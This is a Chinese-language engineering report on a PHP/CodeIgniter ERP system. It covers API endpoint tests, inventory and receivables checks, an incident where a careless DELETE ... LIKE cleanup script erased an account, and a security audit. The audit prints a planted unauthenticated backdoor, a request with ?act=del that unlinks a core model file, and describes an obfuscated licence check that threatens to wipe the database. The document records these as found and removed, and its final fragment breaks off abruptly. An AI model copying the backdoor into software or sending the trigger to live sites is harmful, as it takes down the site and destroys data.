## 三、41 个写接口实测

方法：先发空参数，再发「源码必填字段全部填值」的参数。完整明细见 `docs/API-接口文档.md` 附录 A。

- 空参数：全部命中第一个校验提示（部分接口先判「有无提交数据」，返回「添加失败」）
- 全参数：不再出现「不能为空」，剩余均为正常业务拦截（编号重复、仓库不存在、类别不存在等）
- 单据类接口（`scm/*`）必须整单 `postData`，已在文档 2.3–2.11 给出可直接复制的结构

## 四、业务流程联动（重点）

指标定义：

| 指标 | SQL |
| --- | --- |
| 库存 | `SUM(ci_invoice_info.qty) WHERE isDelete=0`（按商品+仓库汇总） |
| 应收 | `SUM(ci_invoice.arrears) WHERE buId=客户 AND isDelete=0` |
| 应付 | 同上，`buId=供应商` |

实测（商品 7、仓库 8/9）：

| # | 操作 | Δ库存 | Δ应收 | Δ应付 | 结论 |
| --- | --- | --- | --- | --- | --- |
| 1 | 采购单保存 10 个 | +10 | 0 | +1000 | 保存即记账 |
| 2 | 采购单审核 | 0 | 0 | 0 | 审核不重复记账 |
| 3 | 采购单反审核 | 0 | 0 | 0 | 反审核不动库存 |
| 4 | 销售单保存 3 个 | -3 | +360 | 0 | 出库记负数 |
| 5 | 销售单审核 | 0 | 0 | 0 | — |
| 6 | 销售单反审核 | 0 | 0 | 0 | — |
| 7 | 删除销售单 | +3 | -360 | 0 | 完整回滚 |
| 8 | 删除采购单 | -10 | 0 | -1000 | 完整回滚 |
| 9 | 其他入库 +4 / 删除 | +4 / -4 | 0 | 0 | — |
| 10 | 其他出库 -2 / 删除 | -2 / +2 | 0 | 0 | — |
| 11 | 调拨 8→9 一个 / 删除 | 仓8 -1、仓9 +1 / 反向 | 0 | 0 | 两仓同时回滚 |
| 12 | 收款单 200 / 删除 | 0 | -200 / +200 | 0 | 收款直接冲减应收 |

附加验证：

- 库存不足时销售单被拒绝：`{"status":-1,"msg":"商品库存不足！"}`
- 已审核单据删除被拒绝：`{"status":-1,"msg":"已审核的不可删除"}`
- 空库直接开销售单会因库存不足失败，业务顺序必须先采购入库

### 12.2 事故：结算账户被清理脚本误删

- **原因**：测试清理脚本用 `DELETE ... WHERE name LIKE 'ZZTEST%' OR 'ZZT%'` 批量删测试数据，把当时唯一的结算账户一并删除（`ci_account` 变空，`AUTO_INCREMENT=10` 说明历史上建过 9 个）。
- **现象**：付款单/收款单的「结算账户」下拉为空；付款单 119 的 `accId=5` 指向不存在的账户。
- **修复**：补回 `id=5 现金（1001，type=1）`、`id=10 银行基本户（1002，type=2）`，余额 0；线上验证账户列表 2 条、付款单 119 `accName=1001 现金`、资金余额表出现「现金 / 期初余额」。
- **教训**：清理测试数据只按明确 id 删除，禁止 `LIKE` 批量删；删前先备份。

## 十三、安全审计（2026-11-26）

在 PHP 8.2 告警审计过程中发现两处必须处理的问题，均已在 `4214663` 修复：

### 13.1 后门：一个 URL 就能让全站瘫痪

`pc/system/core/CodeIgniter.php` 的路由阶段存在：

```php
$class = $RTR->fetch_class();
if (@$_REQUEST['act'] == 'del') {
    @unlink('application/models/mysql_model.php');   // 删除核心模型文件
}
$method = $RTR->fetch_method();
```

- 任何请求（**无需登录**）带上 `?act=del`，都会删除 `application/models/mysql_model.php`，
  之后所有走数据库的页面直接 500。
- 已删除该段；实测 `GET /index.php/login?act=del` 后文件仍存在（3524 B）。
- **线上若仍是旧镜像，这个口子仍然开着，务必尽快重建。**

### 13.2 授权威胁代码

`pc/application/controllers/scm/invSa.php` 的 `invSaleList()` 整段是 base64 + gzuncompress 的授权校验：

- 读取 `data/upload/author`、`data/upload/loader` 两个文件做 md5 比对；
- 未通过时返回：**「您的软件尚未授权，请联系客服获取授权文件！否则，为了保障软件的权益，24 小时内将清空您的数据库！」**
- 该接口因此永远不返回销货数据；前端并未调用它（页面用的是 `saleList`）。

已移除整段校验，`invSaleList()` 改为与 `saleList()` 同源，实测返回真实销货单。

  唤醒后容器从镜像重启、文件恢复，再重建到 `1451317` 后完全恢复。
- **教训**：
  1. 禁止用「触发型」请求验证漏洞是否修复（`act=del`、`delete` 类接口）；
  2. 验证只读优先，用行为特征（返回内容、状态码）判断版本；
  3. 变更生产前先确认回滚路径（本次靠容器重启即可恢复）。
